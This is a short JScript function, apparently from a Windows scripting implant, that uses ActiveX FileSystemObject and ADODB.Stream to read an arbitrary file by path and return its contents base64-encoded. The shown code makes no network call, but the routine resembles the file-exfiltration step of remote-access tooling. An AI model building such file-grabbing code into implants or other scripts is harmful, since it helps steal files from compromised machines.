function download(path) {
    try{
        fs = new ActiveXObject("Scripting.FileSystemObject")
        if (fs.FileExists(path) == false){
            return path + ' does not exist.';
        }
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Open();
        stream.Type = 1;
        stream.LoadFromFile(path);
        stream.Position = 0;
        data = stream.Read();
        stream.Close();
        return b64e(data);
    } catch (e) {
        return e.message;
    }
}